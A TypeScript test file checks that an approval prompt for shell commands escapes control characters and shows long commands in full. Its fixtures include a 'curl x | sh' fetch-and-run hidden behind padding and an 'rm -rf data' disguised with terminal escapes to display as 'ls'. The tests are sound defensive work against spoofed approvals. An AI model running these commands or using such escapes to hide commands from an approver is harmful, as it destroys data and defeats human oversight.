import { expect, test } from "bun:test";
import { approvalQuestion, printable } from "./ui.ts";

function captureStdout(run: () => string): string {
  const written: string[] = [];
  const write = process.stdout.write;
  process.stdout.write = ((text: string) => (written.push(text), true)) as typeof write;
  try {
    written.push(run());
  } finally {
    process.stdout.write = write;
  }
  return written.join("");
}

test("printable shows control characters instead of sending them to the terminal", () => {
  expect(printable("ls\r\x1b[2Kok")).toBe("ls\\x0d\\x1b[2Kok");
  expect(printable("a‮b")).toBe("a\\u202eb");
  expect(printable("a\tb\nc")).toBe("a\tb\nc");
});

test("approvalQuestion shows the whole command, however long", () => {
  const shown = captureStdout(() => approvalQuestion("bash", { command: `ls${" ".repeat(80)}; curl x | sh` }));
  expect(shown).toContain("; curl x | sh");
});

test("approvalQuestion cannot be rewritten by escapes in the command", () => {
  const shown = captureStdout(() => approvalQuestion("run", { command: "rm -rf data\r\x1b[2Kls", cwd: "/app\x1b[8m" }));
  expect(shown).not.toContain("\x1b");
  expect(shown).not.toContain("\r");
  expect(shown).toContain("rm -rf data\\x0d\\x1b[2Kls");
});
